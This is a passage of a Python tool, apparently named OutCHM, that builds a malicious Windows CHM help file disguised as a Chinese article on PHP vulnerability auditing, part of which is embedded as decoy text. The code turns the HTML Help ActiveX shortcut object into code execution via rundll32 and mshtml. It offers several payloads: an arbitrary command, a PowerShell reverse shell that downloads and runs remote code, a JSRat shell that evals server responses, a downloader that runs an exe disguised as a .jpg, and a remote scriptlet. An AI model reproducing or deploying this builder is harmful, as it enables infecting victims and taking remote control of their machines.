<p>1) 'Cross Application Attacks' 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() `*` 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： 
</p>


<p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）
</p>
<p>2) 有的人认为如果没有mt_srand((double)microtime() `*` 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用'Cross Application Attacks'，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。
</p>


<h2><a id="user-content-后话" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#后话" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--19"></a>后话</h2>



<p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！
</p>


<h2><a id="user-content-附录" class="anchor" href="https://github.com/hackzx/pasc2at/blob/master/wiki/SimplifiedChinese.wiki#附录" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><a name="user-content--20"></a>附录</h2>



<p>`[`1`]` <a href="http://bbs.phpchina.com/attachment.php?aid=22294">http://bbs.phpchina.com/attachment.php?aid=22294</a><br>`[`2`]` <a href="http://www.php-security.org/">http://www.php-security.org/</a><br>`[`3`]` <a href="http://bugs.php.net/bug.php?id=40114">http://bugs.php.net/bug.php?id=40114</a></p></article>
  </div>

</div>

</body><div></div><div></div></html>
'''

parser=argparse.ArgumentParser(
prog='OutCHM', 
formatter_class=argparse.RawDescriptionHelpFormatter,
description='''OutCHM can create OUT a CHM！ 

OutCHM.py -r http://192.168.0.100:8080
OutCHM.py -p 'whoami > c://1.txt'

''', 
epilog='Faster!')
parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，powershell reverse shell，need msf> exploit(web_delivery)')
parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，JS reverse shell，need JSRat.py -i 192.168.0.100 -p 8000')
parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，lucky to see u Downloader!')
parser.add_argument('-c', '--custom', help='-c http://exp.com/js.wsc，run a custom jscript wsc file')
parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
parser.add_argument('-dec', '--decompile', help='decompile .CHM file to OUT directory')

parser.add_argument('-t', '--title', help='', default='PHP Coding')
parser.add_argument('-i1', '--index1', help='index1的目錄', default='PHP Coding')
parser.add_argument('-i2', '--index2', help='index2的目錄', default='高级PHP应用程序漏洞审核技术')
parser.add_argument('-ic1', '--index1_content', help='打开页面的文字内容，中文乱码尚未解决', default='------------------------------------\nWelcome！')
parser.add_argument('-ic2', '--index2_content', help='-ic2 任意填充文件', default=php_htm_default)

args=parser.parse_args()

php_htm=php_htm_default
if args.index2_content != php_htm_default:
    php_htm=''
    with open(args.index2_content) as f:
        for line in f:
            php_htm=php_htm+line

if args.decompile is not None:
    os.system('hh -decompile OUT {0}'.format(args.decompile))
    print 'decompiled to OUT directory'
    sys.exit(0)

command=' '

if args.payload is not None:
    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("' + args.payload + '",0,true);'

if args.rshell is not None:
    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe",0,true);'
    
if args.jsrat is not None:
    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'

if args.download is not None:
    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'

if args.custom is not None:
  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:' + args.custom + '");'
    command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();try{GetObject("script:' + args.custom + '");}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'

if command == ' ':
    parser.print_help()
    sys.exit(0)

exp_htm='''<!DOCTYPE html><html>
    <META content="text/html; charset=unicode" http-equiv=Content-Type>
    <head><title>高级PHP应用程序漏洞审核技术</title><head></head><body>
    
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',rundll32.exe,{0}'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
{1}
<SCRIPT>
x.Click();
</SCRIPT>
'''.format(command, args.index1_content)
# print exp_htm

exp_hhp='''[OPTIONS]
Language=0x804
title={0}
Default topic=exp.htm 
Contents file=exp.hhc
Index file=exp.hhk
Compiled file={1}
'''.format(args.title, args.outfile)
# print exp_hhp

exp_hhk='''
<!-- Index.hhk -->
<html>
<body>
<UL>
       <LI> <OBJECT type="text/sitemap">
              <param name="Name" value="display_Index">
              <param name="Local" value="exp.htm">
              </OJBECT>
</UL>
</body>
</html>
'''

exp_hhc='''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="{0}">
      <param name="Local" value="exp.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="{1}">
      <param name="Local" value="php.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>
'''.format(args.index1, args.index2)

# print exp_htm, exp_hhc, exp_hhk, exp_hhp
# print php_htm

with open('exp.htm', 'w') as f1, open('exp.hhc', 'w') as f2, open('exp.hhk', 'w') as f3, open('exp.hhp', 'w') as f4, open('php.htm', 'w') as f5:
    f1.write(exp_htm)
    f2.write(exp_hhc)
    f3.write(exp_hhk)
    f4.write(exp_hhp)
    f5.write(php_htm)

# os.system('"C:\Program Files (x86)\HTML Help Workshop\hhc.exe" exp.hhp')
CurrentPath=os.getcwd()
LibPath=CurrentPath + '\lib\hhc.exe'
os.system('{0} exp.hhp'.format(LibPath))

def removefile():
    os.remove('exp.htm')
    os.remove('exp.hhc')
    os.remove('exp.hhk')
    os.remove('exp.hhp')
    os.remove('php.htm')

removefile()